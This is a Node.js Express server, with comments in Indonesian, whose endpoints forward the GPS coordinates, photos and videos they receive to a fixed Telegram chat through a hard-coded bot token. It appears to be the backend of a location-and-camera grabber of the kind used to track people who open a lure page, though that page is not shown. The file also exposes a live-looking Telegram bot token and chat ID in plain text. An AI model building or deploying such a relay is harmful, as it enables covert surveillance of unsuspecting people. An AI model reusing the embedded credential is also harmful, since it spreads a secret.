import express from "express";
import axios from "axios";
import multer from "multer";
import cors from "cors";
import fs from "fs";
import FormData from "form-data";

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static("public"));

// buat folder uploads kalau belum ada
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

const upload = multer({ dest: "uploads/" });

// --- KONFIGURASI ---
const TOKEN = "8324052332:AAFG1Jq56p61D-FB8h9Go4BYA_pOkbUsCn4";
const CHAT_ID = "5698334372";

// test route supaya web tidak kosong
app.get("/", (req, res) => {
  res.send("Server aktif 🚀");
});

// kirim lokasi ke telegram
app.post("/kirim-lokasi", async (req, res) => {
  try {
    const { latitude, longitude } = req.body;

    await axios.post(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
      chat_id: CHAT_ID,
      latitude,
      longitude
    });

    res.json({ status: "ok" });
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// kirim foto
app.post("/kirim-foto", upload.single("photo"), async (req, res) => {
  try {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", fs.createReadStream(req.file.path));

    await axios.post(
      `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
      fd,
      { headers: fd.getHeaders() }
    );

    fs.unlinkSync(req.file.path);

    res.json({ status: "ok" });

  } catch (err) {

    if (req.file) fs.unlinkSync(req.file.path);
    res.status(500).send(err.message);

  }
});

// kirim video
app.post("/kirim-video", upload.single("video"), async (req, res) => {
  try {

    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("video", fs.createReadStream(req.file.path));

    await axios.post(
      `https://api.telegram.org/bot${TOKEN}/sendVideo`,
      fd,
      {
        headers: fd.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      }
    );

    fs.unlinkSync(req.file.path);

    res.json({ status: "ok" });

  } catch (err) {

    if (req.file) fs.unlinkSync(req.file.path);
    res.status(500).send(err.message);

  }
});

// PORT untuk Railway
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server berjalan di port " + PORT);
});